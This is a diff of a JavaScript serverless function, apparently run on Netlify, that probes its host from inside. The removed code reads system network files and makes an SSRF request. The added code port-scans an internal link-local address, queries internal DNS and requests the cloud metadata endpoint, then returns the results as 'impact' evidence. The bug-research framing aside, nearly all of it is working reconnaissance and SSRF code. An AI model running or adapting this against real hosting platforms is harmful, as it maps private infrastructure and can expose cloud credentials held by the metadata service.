@@ -1,54 +1,48 @@
-const fs = require('fs');
 const http = require('http');
+const net = require('net');
 
 exports.handler = async (event, context) => {
-  const bugReport = {};
+  const impact = {};
+  const targetIp = '169.254.100.5';
 
-  // --- PROBE 1: SSRF to Internal Netlify API ---
-  const checkInternal = (ip) => new Promise((resolve) => {
-    const req = http.get(`http://${ip}/`, { timeout: 2000 }, (res) => {
-      resolve({
-        status: res.statusCode,
-        headers: res.headers
-      });
-    });
-    req.on('error', (e) => resolve(`Failed: ${e.message}`));
+  // 1. Port Scanning
+  const checkPort = (port) => new Promise((resolve) => {
+    const socket = new net.Socket();
+    socket.setTimeout(500);
+    socket.on('connect', () => { socket.destroy(); resolve(true); });
+    socket.on('timeout', () => { socket.destroy(); resolve(false); });
+    socket.on('error', () => { socket.destroy(); resolve(false); });
+    socket.connect(port, targetIp);
   });
 
-  bugReport.ssrf_test = await checkInternal('18.208.88.157');
-
-  // --- PROBE 2: Container Escape / Directory Traversal ---
-  const secretPaths = [
-    '/proc/net/arp',
-    '/etc/resolv.conf',
-    '/etc/hosts'
-  ];
-
-  bugReport.file_leak = {};
-  secretPaths.forEach(p => {
-    try {
-      bugReport.file_leak[p] = fs.readFileSync(p, 'utf8').substring(0, 200);
-    } catch (e) {
-      bugReport.file_leak[p] = `Denied: ${e.message}`;
-    }
-  });
-
-  // --- PROBE 3: ARP Table (Network Disclosure) ---
-  try {
-    bugReport.arp_table = fs.readFileSync('/proc/net/arp', 'utf8');
-  } catch (e) {
-    bugReport.arp_table = "Forbidden";
+  // Scan port: 53 (DNS), 80 (HTTP), 8080 (Proxy), 9001 (Lambda Runtime)
+  const portsToScan = [53, 80, 8080, 9001];
+  impact.open_ports = {};
+  for (const port of portsToScan) {
+    impact.open_ports[port] = await checkPort(port);
   }
 
-  console.log('--- BUG RESEARCH LOG ---');
-  console.log(JSON.stringify(bugReport, null, 2));
-  await new Promise(r => setTimeout(r, 500)); 
+  // 2. DNS Poisoning / Spoofing Test
+  const dns = require('dns').promises;
+  try {
+    impact.dns_internal_query = await dns.resolve('netlify-internal.com');
+  } catch (e) { impact.dns_internal_query = e.message; }
+
+  // 3. SSRF Cloud Metadata (Alternative Path)
+  const checkMetadataWithHeader = () => new Promise((resolve) => {
+    const options = {
+      hostname: '169.254.169.254',
+      path: '/latest/meta-data/',
+      headers: { 'Metadata-Flavor': 'Google' }, // Iseng kalau ternyata ini GCP-base
+      timeout: 1000
+    };
+    http.get(options, (res) => resolve(`Found with Header! Status: ${res.statusCode}`))
+        .on('error', (e) => resolve(`Failed: ${e.message}`));
+  });
+  impact.metadata_v2_test = await checkMetadataWithHeader();
 
   return {
     statusCode: 200,
-    body: JSON.stringify({ 
-        research_status: "Complete", 
-        evidence: bugReport 
-    }, null, 2)
+    body: JSON.stringify({ message: "Impact Search", data: impact }, null, 2)
   };
 };
